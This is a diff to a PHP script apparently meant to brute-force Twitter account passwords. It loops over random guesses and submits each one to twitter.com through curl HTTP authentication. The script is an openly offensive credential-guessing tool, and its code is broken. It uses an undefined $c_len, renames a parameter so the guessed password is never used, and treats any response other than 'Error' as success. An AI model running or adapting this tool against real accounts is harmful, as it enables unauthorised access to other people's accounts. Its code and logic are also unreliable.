@@ -15,7 +15,7 @@ function bruteForce($username, $Pass1)
 {
 while(True)
 {     
-	$Pass = md5(rand(1, 12));
+	$Pass = crypt(rand(6, $c_len));
 
 	if(check_correct($username, $Pass)) {
             die("<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
@@ -40,7 +40,7 @@ ce attack.</b></div>
 }
 echo "</body>
 </html>";
-function check_correct($username, $Pass)
+function check_correct($username, $password)
 {
 	$c = curl_init('https://twitter.com');
         curl_setopt($c, CURLOPT_HTTPAUTH, CURLAUTH_ANY); // use authentication
@@ -53,9 +53,7 @@ function check_correct($username, $Pass)
         curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 0); // always stay authorised
         $str = curl_exec($c); // Get it
         curl_close($c); 
-	if($str == "Followers") {return true;}
+	if($str != "Error") {return true;}
         else {return false;}
 }
-bruteForce($username, $Pass1);
-echo "NO PASSWORD FOUND"; 
 ?>
